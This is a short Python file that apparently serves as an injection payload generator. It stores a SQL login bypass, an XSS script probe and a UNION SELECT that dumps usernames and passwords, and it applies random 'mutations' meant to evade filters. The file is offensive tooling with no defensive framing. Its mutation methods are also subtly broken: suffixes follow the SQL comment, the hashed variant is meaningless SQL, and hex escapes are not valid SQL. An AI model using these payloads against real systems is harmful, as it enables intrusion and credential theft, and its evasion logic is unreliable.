import random
import string
import hashlib

class AdaptivePayload:
    def __init__(self):
        self.base_payloads = [
            "' OR 1=1 --", 
            "<script>alert('XSS')</script>", 
            "admin' UNION SELECT null, username, password FROM users --"
        ]
        self.mutation_strategies = [
            self.random_suffix,
            self.hash_based,
            self.sql_obfuscation
        ]

    def generate_payload(self):
        base_payload = random.choice(self.base_payloads)
        mutation_strategy = random.choice(self.mutation_strategies)
        return mutation_strategy(base_payload)
    
    def random_suffix(self, payload):
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        return f"{payload}{random_suffix}"

    def hash_based(self, payload):
        hashed_payload = hashlib.sha256(payload.encode('utf-8')).hexdigest()
        return f"UNION SELECT null, '{hashed_payload}' --"

    def sql_obfuscation(self, payload):
        hex_payload = ''.join([f"\\x{hex(ord(c))[2:]}" for c in payload])
        return f"{hex_payload} --"
